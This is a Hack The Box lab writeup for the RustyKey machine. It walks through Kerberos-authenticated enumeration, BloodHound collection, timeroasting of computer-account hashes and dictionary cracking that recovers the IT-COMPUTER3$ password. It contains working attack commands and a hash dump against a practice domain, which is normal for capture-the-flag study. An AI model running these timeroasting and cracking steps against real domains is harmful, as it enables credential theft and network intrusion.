---
title: RustyKey [Hard]
date: 2025-07-02
tags: [htb, windows, nmap, smb, ldap, kerberos, rbcd, timeroasting, cracking, bloodhound, addself, forcechangepassword, addallowedtoact, evil-winrm, psexec, wmiexec, runascs, getst, rdate, com-hijacking, msfvenom, reg, registry, dll, hashcat, nxc, ldapsearch, get-adcomputer, get-acl, s4u2self, set-adcomputer]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/rustykey-htb-season8
image: /assets/img/rustykey-htb-season8/rustykey-htb-season8_banner.png
---

# RustyKey HTB Season 8
## Machine information
As is common in real life Windows pentests, you will start the RustyKey box with credentials for the following account: `rr.parker` / `8#t5HE8L!W3A` <br>
Author: [EmSec](https://app.hackthebox.com/users/962022)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.4.62  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 04:25 EDT
Nmap scan report for 10.129.4.62
Host is up (0.18s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-30 16:36:43Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
1036/tcp  filtered nsstp
1108/tcp  filtered ratio-adp
1183/tcp  filtered llsurfup-http
2106/tcp  filtered ekshell
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9100/tcp  filtered jetdirect
30718/tcp filtered unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h59m59s
| smb2-time: 
|   date: 2025-06-30T16:36:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 711.12 seconds
```

Add these to `/etc/hosts` file:
```bash
10.129.4.62     rustykey.htb dc.rustykey.htb
```

### Enum users
```bash
└─$ sudo crackmapexec smb 10.129.4.62 -u rr.parker -p '8#t5HE8L!W3A' --users 
SMB         10.129.4.62     445    10.129.4.62      [*]  x64 (name:10.129.4.62) (domain:10.129.4.62) (signing:True) (SMBv1:False)
SMB         10.129.4.62     445    10.129.4.62      [-] 10.129.4.62\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
```

From the nmap result, we can see that is machine has kerberos service so we need to use kerberos authentication.

```bash
└─$ sudo crackmapexec smb 10.129.4.62 -u rr.parker -p '8#t5HE8L!W3A' -k --users
SMB         10.129.4.62     445    10.129.4.62      [*]  x64 (name:10.129.4.62) (domain:10.129.4.62) (signing:True) (SMBv1:False)
SMB         10.129.4.62     445    10.129.4.62      [-] 10.129.4.62\rr.parker: KDC_ERR_WRONG_REALM
```

So we need to use the correct realm name by create a file `krb5.conf` in `/etc/krb5.conf` and add the following content:
```bash
[libdefaults]
    default_realm = RUSTYKEY.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = yes
    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

[realms]
    RUSTYKEY.HTB = {
        kdc = dc.rustykey.htb
        admin_server = dc.rustykey.htb
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB
```

Now let's try again.

```bash
└─$ sudo nxc smb dc.rustykey.htb -d rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --users
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
SMB         dc.rustykey.htb 445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         dc.rustykey.htb 445    dc               Administrator                 2025-06-04 22:52:22 0       Built-in account for administering the computer/domain 
SMB         dc.rustykey.htb 445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         dc.rustykey.htb 445    dc               krbtgt                        2024-12-27 00:53:40 0       Key Distribution Center Service Account 
SMB         dc.rustykey.htb 445    dc               rr.parker                     2025-06-04 22:54:15 0        
SMB         dc.rustykey.htb 445    dc               mm.turner                     2024-12-27 10:18:39 0        
SMB         dc.rustykey.htb 445    dc               bb.morgan                     2025-07-02 13:01:40 0        
SMB         dc.rustykey.htb 445    dc               gg.anderson                   2025-07-02 13:01:40 0        
SMB         dc.rustykey.htb 445    dc               dd.ali                        2025-07-02 13:01:40 0        
SMB         dc.rustykey.htb 445    dc               ee.reed                       2025-07-02 13:01:40 0        
SMB         dc.rustykey.htb 445    dc               nn.marcos                     2024-12-27 11:34:50 0        
SMB         dc.rustykey.htb 445    dc               backupadmin                   2024-12-30 00:30:18 0        
SMB         dc.rustykey.htb 445    dc               [*] Enumerated 11 local users: RUSTYKEY
```

> Remember to `sudo rdate -n 10.129.4.62` to sync the time with the target machine incase of kerberos authentication failure by clock skew.

We got some users: `Administrator`, `Guest`, `krbtgt`, `rr.parker`, `mm.turner`, `bb.morgan`, `gg.anderson`, `dd.ali`, `ee.reed`, `nn.marcos`, `backupadmin`.

We can also use [ldapsearch](https://linux.die.net/man/1/ldapsearch) to enumerate users and even more.

```bash
└─$ ldapsearch -x -H ldap://dc.rustykey.htb -D 'rr.parker@rustykey.htb' -w '8#t5HE8L!W3A' -b 'dc=rustykey,dc=htb' "(objectClass=user)" userPrincipalName sAMAccountName
# extended LDIF
#
# LDAPv3
# base <dc=rustykey,dc=htb> with scope subtree
# filter: (objectClass=user)
# requesting: userPrincipalName sAMAccountName 
#

# Administrator, Users, rustykey.htb
dn: CN=Administrator,CN=Users,DC=rustykey,DC=htb
sAMAccountName: Administrator

# Guest, Users, rustykey.htb
dn: CN=Guest,CN=Users,DC=rustykey,DC=htb
sAMAccountName: Guest

# DC, Domain Controllers, rustykey.htb
dn: CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
sAMAccountName: DC$

# krbtgt, Users, rustykey.htb
dn: CN=krbtgt,CN=Users,DC=rustykey,DC=htb
sAMAccountName: krbtgt

# Support-Computer1, Computers, Support, rustykey.htb
dn: CN=Support-Computer1,OU=Computers,OU=Support,DC=rustykey,DC=htb
sAMAccountName: Support-Computer1$

# Support-Computer2, Computers, Support, rustykey.htb
dn: CN=Support-Computer2,OU=Computers,OU=Support,DC=rustykey,DC=htb
sAMAccountName: Support-Computer2$

# Support-Computer3, Computers, Support, rustykey.htb
dn: CN=Support-Computer3,OU=Computers,OU=Support,DC=rustykey,DC=htb
sAMAccountName: Support-Computer3$

# Support-Computer4, Computers, Support, rustykey.htb
dn: CN=Support-Computer4,OU=Computers,OU=Support,DC=rustykey,DC=htb
sAMAccountName: Support-Computer4$

# Support-Computer5, Computers, Support, rustykey.htb
dn: CN=Support-Computer5,OU=Computers,OU=Support,DC=rustykey,DC=htb
sAMAccountName: Support-Computer5$

# Finance-Computer1, Computers, Finance, rustykey.htb
dn: CN=Finance-Computer1,OU=Computers,OU=Finance,DC=rustykey,DC=htb
sAMAccountName: Finance-Computer1$

# Finance-Computer2, Computers, Finance, rustykey.htb
dn: CN=Finance-Computer2,OU=Computers,OU=Finance,DC=rustykey,DC=htb
sAMAccountName: Finance-Computer2$

# Finance-Computer3, Computers, Finance, rustykey.htb
dn: CN=Finance-Computer3,OU=Computers,OU=Finance,DC=rustykey,DC=htb
sAMAccountName: Finance-Computer3$

# Finance-Computer4, Computers, Finance, rustykey.htb
dn: CN=Finance-Computer4,OU=Computers,OU=Finance,DC=rustykey,DC=htb
sAMAccountName: Finance-Computer4$

# Finance-Computer5, Computers, Finance, rustykey.htb
dn: CN=Finance-Computer5,OU=Computers,OU=Finance,DC=rustykey,DC=htb
sAMAccountName: Finance-Computer5$

# IT-Computer1, Computers, IT, rustykey.htb
dn: CN=IT-Computer1,OU=Computers,OU=IT,DC=rustykey,DC=htb
sAMAccountName: IT-Computer1$

# IT-Computer2, Computers, IT, rustykey.htb
dn: CN=IT-Computer2,OU=Computers,OU=IT,DC=rustykey,DC=htb
sAMAccountName: IT-Computer2$

# IT-Computer3, Computers, IT, rustykey.htb
dn: CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb
sAMAccountName: IT-Computer3$

# IT-Computer4, Computers, IT, rustykey.htb
dn: CN=IT-Computer4,OU=Computers,OU=IT,DC=rustykey,DC=htb
sAMAccountName: IT-Computer4$

# IT-Computer5, Computers, IT, rustykey.htb
dn: CN=IT-Computer5,OU=Computers,OU=IT,DC=rustykey,DC=htb
sAMAccountName: IT-Computer5$

# rr.parker, Users, rustykey.htb
dn: CN=rr.parker,CN=Users,DC=rustykey,DC=htb
sAMAccountName: rr.parker
userPrincipalName: rr.parker@rustykey.htb

# mm.turner, Users, rustykey.htb
dn: CN=mm.turner,CN=Users,DC=rustykey,DC=htb
sAMAccountName: mm.turner
userPrincipalName: mm.turner@rustykey.htb

# bb.morgan, Users, IT, rustykey.htb
dn: CN=bb.morgan,OU=Users,OU=IT,DC=rustykey,DC=htb
sAMAccountName: bb.morgan
userPrincipalName: bb.morgan@rustykey.htb

# gg.anderson, Users, IT, rustykey.htb
dn: CN=gg.anderson,OU=Users,OU=IT,DC=rustykey,DC=htb
sAMAccountName: gg.anderson
userPrincipalName: gg.anderson@rustykey.htb

# dd.ali, Users, Finance, rustykey.htb
dn: CN=dd.ali,OU=Users,OU=Finance,DC=rustykey,DC=htb
sAMAccountName: dd.ali
userPrincipalName: dd.ali@rustykey.htb

# ee.reed, Users, Support, rustykey.htb
dn: CN=ee.reed,OU=Users,OU=Support,DC=rustykey,DC=htb
sAMAccountName: ee.reed
userPrincipalName: ee.reed@rustykey.htb

# nn.marcos, Users, rustykey.htb
dn: CN=nn.marcos,CN=Users,DC=rustykey,DC=htb
sAMAccountName: nn.marcos
userPrincipalName: nn.marcos@rustykey.htb

# backupadmin, Users, rustykey.htb
dn: CN=backupadmin,CN=Users,DC=rustykey,DC=htb
sAMAccountName: backupadmin
userPrincipalName: backupadmin@rustykey.htb

# search reference
ref: ldap://ForestDnsZones.rustykey.htb/DC=ForestDnsZones,DC=rustykey,DC=htb

# search reference
ref: ldap://DomainDnsZones.rustykey.htb/DC=DomainDnsZones,DC=rustykey,DC=htb

# search reference
ref: ldap://rustykey.htb/CN=Configuration,DC=rustykey,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 31
# numEntries: 27
# numReferences: 3
```

Found more users: `Support-Computer1`, `Support-Computer2`, `Support-Computer3`, `Support-Computer4`, `Support-Computer5`, `Finance-Computer1`, `Finance-Computer2`, `Finance-Computer3`, `Finance-Computer4`, `Finance-Computer5`, `IT-Computer1`, `IT-Computer2`, `IT-Computer3`, `IT-Computer4`, `IT-Computer5`. <br>
So this machine contains a lot of PCs.

Just some bonus enum.

```bash
└─$ sudo nxc ldap dc.rustykey.htb -d rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --users
LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
LDAP        dc.rustykey.htb 389    DC               [*] Enumerated 11 domain users: rustykey.htb
LDAP        dc.rustykey.htb 389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        dc.rustykey.htb 389    DC               Administrator                 2025-06-04 18:52:22 0        Built-in account for administering the computer/domain      
LDAP        dc.rustykey.htb 389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        dc.rustykey.htb 389    DC               krbtgt                        2024-12-26 19:53:40 0        Key Distribution Center Service Account                     
LDAP        dc.rustykey.htb 389    DC               rr.parker                     2025-06-04 18:54:15 0                                                                    
LDAP        dc.rustykey.htb 389    DC               mm.turner                     2024-12-27 05:18:39 0                                                                    
LDAP        dc.rustykey.htb 389    DC               bb.morgan                     2025-06-30 13:31:40 0                                                                    
LDAP        dc.rustykey.htb 389    DC               gg.anderson                   2025-06-30 13:31:40 0                                                                    
LDAP        dc.rustykey.htb 389    DC               dd.ali                        2025-06-30 13:31:40 0                                                                    
LDAP        dc.rustykey.htb 389    DC               ee.reed                       2025-06-30 13:31:40 0                                                                    
LDAP        dc.rustykey.htb 389    DC               nn.marcos                     2024-12-27 06:34:50 0                                                                    
LDAP        dc.rustykey.htb 389    DC               backupadmin                   2024-12-29 19:30:18 0
```

Now we gonna request **Ticket Granting Ticket** for `rr.parker` user.

```bash
└─$ getTGT.py -dc-ip 10.129.4.62 rustykey.htb/rr.parker:'8#t5HE8L!W3A'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in rr.parker.ccache
```

Then we set the ticket to the environment variable.

```bash
└─$ export KRB5CCNAME=rr.parker.ccache
```

Checking the ticket.

```bash
└─$ klist
Ticket cache: FILE:rr.parker.ccache
Default principal: rr.parker@RUSTYKEY.HTB

Valid starting       Expires              Service principal
06/30/2025 13:48:49  06/30/2025 23:48:49  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
        renew until 07/01/2025 13:47:59
```

Now we can use BloodHound to enumerate the machine with kerberos authentication.

### BloodHound
```bash
└─$ bloodhound-python -u 'rr.parker' -p '8#t5HE8L!W3A' -d rustykey.htb -c All -o bloodhound_results.json -ns 10.129.4.62
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: rustykey.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
INFO: Done in 00M 35S
```

Turn on the BloodHound web server and inject the `bloodhound_results.json_*` file.

![BloodHound](/assets/img/rustykey-htb-season8/bloodhound.png)

After a while look around, we found some useful information, gonna list them out.

We see that there is a `IT-COMPUTER3.RUSTYKEY.HTB` computer account has **AddSelf** privilege to `HELPDESK@RUSTYKEY.HTB` group.

![AddSelf](/assets/img/rustykey-htb-season8/addself.png)

What more? `HELPDESK@RUSTYKEY.HTB` group has **ForceChangePassword** privilege to 4 users: `BB.MORGAN`, `EE.REED`, `GG.ANDERSON`, `DD.ALI`.

![ForceChangePassword](/assets/img/rustykey-htb-season8/forcechangepassword.png)

Found out that user `MM.TURNER` has **AddAllowedToAct** privilege over `DC.RUSTYKEY.HTB`.

![AddAllowedToAct](/assets/img/rustykey-htb-season8/addallowedtoact.png)

From those user, there is 3 users which we can connect via evil-winrm: `BB.MORGAN`, `EE.REED`, `GG.ANDERSON` cause they are memeber of `REMOTE MANAGEMENT USERS@RUSTYKEY.HTB` group.

![Evil-WinRM](/assets/img/rustykey-htb-season8/evil-winrm.png)

### Timeroasting & Cracking
```bash
└─$ ldapsearch -x -H ldap://dc.rustykey.htb -D 'rr.parker@rustykey.htb' -w '8#t5HE8L!W3A' -b 'dc=rustykey,dc=htb' "(&(objectClass=computer)(servicePrincipalName=*))" samaccountname servicePrincipalName
# extended LDIF
#
# LDAPv3
# base <dc=rustykey,dc=htb> with scope subtree
# filter: (&(objectClass=computer)(servicePrincipalName=*))
# requesting: samaccountname servicePrincipalName 
#

# DC, Domain Controllers, rustykey.htb
dn: CN=DC,OU=Domain Controllers,DC=rustykey,DC=htb
sAMAccountName: DC$
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.rustykey.ht
 b
servicePrincipalName: ldap/dc.rustykey.htb/ForestDnsZones.rustykey.htb
servicePrincipalName: ldap/dc.rustykey.htb/DomainDnsZones.rustykey.htb
servicePrincipalName: DNS/dc.rustykey.htb
servicePrincipalName: GC/dc.rustykey.htb/rustykey.htb
servicePrincipalName: RestrictedKrbHost/dc.rustykey.htb
servicePrincipalName: RestrictedKrbHost/DC
servicePrincipalName: RPC/f04f9824-3b21-4a95-91c7-3d5632f17995._msdcs.rustykey
 .htb
servicePrincipalName: HOST/DC/RUSTYKEY
servicePrincipalName: HOST/dc.rustykey.htb/RUSTYKEY
servicePrincipalName: HOST/DC
servicePrincipalName: HOST/dc.rustykey.htb
servicePrincipalName: HOST/dc.rustykey.htb/rustykey.htb
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/f04f9824-3b21-4a95-
 91c7-3d5632f17995/rustykey.htb
servicePrincipalName: ldap/DC/RUSTYKEY
servicePrincipalName: ldap/f04f9824-3b21-4a95-91c7-3d5632f17995._msdcs.rustyke
 y.htb
servicePrincipalName: ldap/dc.rustykey.htb/RUSTYKEY
servicePrincipalName: ldap/DC
servicePrincipalName: ldap/dc.rustykey.htb
servicePrincipalName: ldap/dc.rustykey.htb/rustykey.htb

# search reference
ref: ldap://ForestDnsZones.rustykey.htb/DC=ForestDnsZones,DC=rustykey,DC=htb

# search reference
ref: ldap://DomainDnsZones.rustykey.htb/DC=DomainDnsZones,DC=rustykey,DC=htb

# search reference
ref: ldap://rustykey.htb/CN=Configuration,DC=rustykey,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

From this result, we are can that there is a leak of `servicePrincipalName` of `DC$`.

```bash
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.rustykey.htb
```

We see there is [DFSR](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/dfsr/dfsr-overview) service and this one user to folder replication between many server in Active Directory Domain. <br>
If we take a look at the name of this name `Rustykey` which is a very old like outdated, which we can related to weakness cryptography is `RC4 encryption` and if we take a look, this one [article](https://www.tencentcloud.com/techpedia/102471) tell about some disadvantages of this encryption. <br>
&rarr; We can able to attempt to request **Ticket Granting Ticket** and crack the hash.

Has tried with [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) but it failed. <br>
&rarr; Gonna try [Timeroast](https://github.com/SecuraBV/Timeroast) which is trying to abuse the NTP protocol to extract hash from computer and trust account in domain controller. [refs](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)

But after checking the help menu from `nxc` tool.

```bash
└─$ sudo nxc smb -L    
LOW PRIVILEGE MODULES
...
[*] timeroast                 Timeroasting exploits Windows NTP authentication to request password hashes of any computer or trust account
...
```

There is an option to use `timeroast`.

```bash
└─$ sudo nxc smb 10.129.4.62 -M timeroast
SMB         10.129.4.62     445    10.129.4.62      [*]  x64 (name:10.129.4.62) (domain:10.129.4.62) (signing:True) (SMBv1:False) (NTLM:False)
TIMEROAST   10.129.4.62     445    10.129.4.62      [*] Starting Timeroasting...
TIMEROAST   10.129.4.62     445    10.129.4.62      1000:$sntp-ms$43357735594320124394a208f54939a1$1c0111e900000000000a37d94c4f434cec0d3867ca407e75e1b8428bffbfcd0aec0d82098627c46aec0d82098628042b
TIMEROAST   10.129.4.62     445    10.129.4.62      1103:$sntp-ms$c717212744ad7ef3e2e42704e5b75112$1c0111e900000000000a37da4c4f434cec0d3867cac1fc8fe1b8428bffbfcd0aec0d820a36ca0c28ec0d820a36ca4533
TIMEROAST   10.129.4.62     445    10.129.4.62      1104:$sntp-ms$3a6005d926bc809127ee1fcec374452e$1c0111e900000000000a37da4c4f434cec0d3867c8b49aa6e1b8428bffbfcd0aec0d820a3893ac19ec0d820a3893f799
TIMEROAST   10.129.4.62     445    10.129.4.62      1105:$sntp-ms$ea9d8581f2ceca3580f0322e23e811f3$1c0111e900000000000a37da4c4f434cec0d3867ca9d0635e1b8428bffbfcd0aec0d820a3a7bf46dec0d820a3a7c55bb
TIMEROAST   10.129.4.62     445    10.129.4.62      1106:$sntp-ms$9dcadf13e60f14e13833fac3f6ec348b$1c0111e900000000000a37da4c4f434cec0d3867c8781b9ae1b8428bffbfcd0aec0d820a3c6fcc40ec0d820a3c6ffce8
TIMEROAST   10.129.4.62     445    10.129.4.62      1107:$sntp-ms$1460538d571aa0029c84f3c4745d31cf$1c0111e900000000000a37da4c4f434cec0d3867c9d699d5e1b8428bffbfcd0aec0d820a3dce4dd6ec0d820a3dce7b22
TIMEROAST   10.129.4.62     445    10.129.4.62      1118:$sntp-ms$cf47ad5c2ab4bb2fc718953418f366ad$1c0111e900000000000a37da4c4f434cec0d3867c911d798e1b8428bffbfcd0aec0d820a5101556aec0d820a5101896c
TIMEROAST   10.129.4.62     445    10.129.4.62      1119:$sntp-ms$38aacb1658c3d08a261c971778b36abe$1c0111e900000000000a37da4c4f434cec0d3867caed1da5e1b8428bffbfcd0aec0d820a52dc966eec0d820a52dcd2d4
TIMEROAST   10.129.4.62     445    10.129.4.62      1120:$sntp-ms$878e3b416631b0c3ec8e28782feaff28$1c0111e900000000000a37da4c4f434cec0d3867c85bb609e1b8428bffbfcd0aec0d820a5463caaaec0d820a5463f9a4
TIMEROAST   10.129.4.62     445    10.129.4.62      1121:$sntp-ms$97c8fdb0d9d707ee7a2b60f6e9066b7a$1c0111e900000000000a37da4c4f434cec0d3867ca021c39e1b8428bffbfcd0aec0d820a560a236fec0d820a560a668b
TIMEROAST   10.129.4.62     445    10.129.4.62      1122:$sntp-ms$c72afb480f1f634116f456a38b44a6b6$1c0111e900000000000a37da4c4f434cec0d3867c7b73083e1b8428bffbfcd0aec0d820a57964f62ec0d820a57968009
TIMEROAST   10.129.4.62     445    10.129.4.62      1123:$sntp-ms$f9bc9df2b8f6534cc2c48f7c127b9f58$1c0111e900000000000a37da4c4f434cec0d3867c95bec8fe1b8428bffbfcd0aec0d820a593b0b6eec0d820a593b3a68
TIMEROAST   10.129.4.62     445    10.129.4.62      1124:$sntp-ms$7f109ca40e0a541f5591024dc83c031d$1c0111e900000000000a37da4c4f434cec0d3867c6ee6edee1b8428bffbfcd0aec0d820a5ae62131ec0d820a5ae64e7e
TIMEROAST   10.129.4.62     445    10.129.4.62      1125:$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$1c0111e900000000000a37da4c4f434cec0d3867c8aa087ce1b8428bffbfcd0aec0d820a5ca1bc7dec0d820a5ca1eb77
TIMEROAST   10.129.4.62     445    10.129.4.62      1126:$sntp-ms$fc76bd81d715769bffd899535c3869f6$1c0111e900000000000a37da4c4f434cec0d3867ca449f6ce1b8428bffbfcd0aec0d820a5e3c51bfec0d820a5e3c80b9
TIMEROAST   10.129.4.62     445    10.129.4.62      1127:$sntp-ms$0ae03774925da97f948b1da16fdde456$1c0111e900000000000a37da4c4f434cec0d3867c7f2e63ce1b8428bffbfcd0aec0d820a60032c04ec0d820a60035cab
```

Grab a lot of hashes, it would take a while to crack them so we need to find the one that we need to crack. <br>
&rarr; Checking back the bloodhound.

![BloodHound](/assets/img/rustykey-htb-season8/bloodhound_2.png)

See that the `Object ID` of `IT-COMPUTER3` is `S-1-5-21-3316070415-896458127-4139322052-1125` and we check the result above, we see that the `1125` is the one we need to crack.

```bash
TIMEROAST   10.129.4.62     445    10.129.4.62      1125:$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$1c0111e900000000000a37da4c4f434cec0d3867c8aa087ce1b8428bffbfcd0aec0d820a5ca1bc7dec0d820a5ca1eb77
```

After searching for this hash, we found out this [article](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac) which is a good guide to crack the hash.

![Cracking](/assets/img/rustykey-htb-season8/cracking.png)

To able to crack this hash, we need to use `31300` mode which we can get it from [beta](https://hashcat.net/beta/hashcat-6.2.6%2B1062.7z).

```bash
└─$ cat timeroast_hash.txt
$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$1c0111e900000000000a37da4c4f434cec0d3867c8aa087ce1b8428bffbfcd0aec0d820a5ca1bc7dec0d820a5ca1eb77
```

```bash
└─$ ./hashcat.bin -a 0 -m 31300 timeroast_hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6-1062-gf8df94f45) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu-skylake-avx512-Intel(R) Core(TM) i5-1038NG7 CPU @ 2.00GHz, 1456/2912 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

* Device #1: Not enough allocatable device memory or free host memory for mapping.

Started: Mon Jun 30 15:45:12 2025
Stopped: Mon Jun 30 15:45:39 2025
```

Dang it, this kali does not has enough memory to crack but I think it will be able to crack it. <br>
&rarr; Jump back to [Timeroast](https://github.com/SecuraBV/Timeroast) there is a [timecrack.py](https://github.com/SecuraBV/Timeroast/blob/main/extra-scripts/timecrack.py) script to crack the hash.

```bash
└─$ cat timeroast_hash.txt
1125:$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$1c0111e900000000000a37da4c4f434cec0d3867c8aa087ce1b8428bffbfcd0aec0d820a5ca1bc7dec0d820a5ca1eb77
```

```bash
└─$ python3 timecrack.py timeroast_hash.txt /usr/share/wordlists/rockyou.txt    
Traceback (most recent call last):
  File "/home/kali/HTB_Labs/DEPTHS_Season8/RustyKey/timecrack.py", line 71, in <module>
    main()
    ~~~~^^
  File "/home/kali/HTB_Labs/DEPTHS_Season8/RustyKey/timecrack.py", line 64, in main
    for rid, password in try_crack(args.hashes, args.dictionary):
                         ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/HTB_Labs/DEPTHS_Season8/RustyKey/timecrack.py", line 44, in try_crack
    for password in dictfile:
                    ^^^^^^^^
  File "<frozen codecs>", line 325, in decode
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invalid continuation byte
```

So we are dealing with the `UnicodeDecodeError` error, we need to fix it.

```bash
#!/usr/bin/env python3
"""Perform a simple dictionary attack against the output of timeroast.py."""
from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
from typing import TextIO, Generator, Tuple
import hashlib, sys, re

HASH_FORMAT = r'^(?P<rid>\d+):\$sntp-ms\$(?P<hashval>[0-9a-f]{32})\$(?P<salt>[0-9a-f]{96})$'

def md4(data : bytes) -> bytes:
  try:
    return hashlib.new('md4', data).digest()
  except ValueError:
    from md4 import MD4
    return MD4(data).bytes()

def compute_hash(password : str, salt : bytes) -> bytes:
  """Compute a legacy NTP authenticator 'hash'."""
  return hashlib.md5(md4(password.encode('utf-16le')) + salt).digest()
    
def try_crack(hashfile : TextIO, dictfile : TextIO) -> Generator[Tuple[int, str], None, None]:
  hashes = []
  for line in hashfile:
    line = line.strip()
    if line:
      m = re.match(HASH_FORMAT, line)
      if not m:
        print(f'ERROR: invalid hash format: {line}', file=sys.stderr)
        sys.exit(1)
      rid, hashval, salt = m.group('rid', 'hashval', 'salt')
      hashes.append((int(rid), unhexlify(hashval), unhexlify(salt)))
  
  for password in dictfile:
    password = password.strip()
    for rid, hashval, salt in hashes:
      if compute_hash(password, salt) == hashval:
        yield rid, password

def main():
  argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
"""Perform a simple dictionary attack against the output of timeroast.py.""")
  argparser.add_argument('hashes', type=FileType('r'), help='Output of timeroast.py')
  # FIX: Use latin-1 encoding for dictionary
  argparser.add_argument('dictionary', type=lambda f: open(f, encoding='latin-1'), 
                        help='Line-delimited password dictionary')
  args = argparser.parse_args()
  
  crackcount = 0
  for rid, password in try_crack(args.hashes, args.dictionary):
    print(f'[+] Cracked RID {rid} password: {password}')
    crackcount += 1
  print(f'\n{crackcount} passwords recovered.')

if __name__ == '__main__':
  main()
```

Fix with by using `latin-1` encoding for dictionary.

```bash
└─$ python3 timecrack.py timeroast_hash.txt /usr/share/wordlists/rockyou.txt
[+] Cracked RID 1125 password: Rusty88!

1 passwords recovered.
```

Boom, we got the passowrd for `IT-COMPUTER3` computer account. <br>
&rarr; `IT-COMPUTER3$:Rusty88!`

From the bloodhound result that we gather earlier, we just grab the `IT-COMPUTER3` computer account. Now we will leverage to **AddSelf** to `HELPDESK@RUSTYKEY.HTB` group. <br>
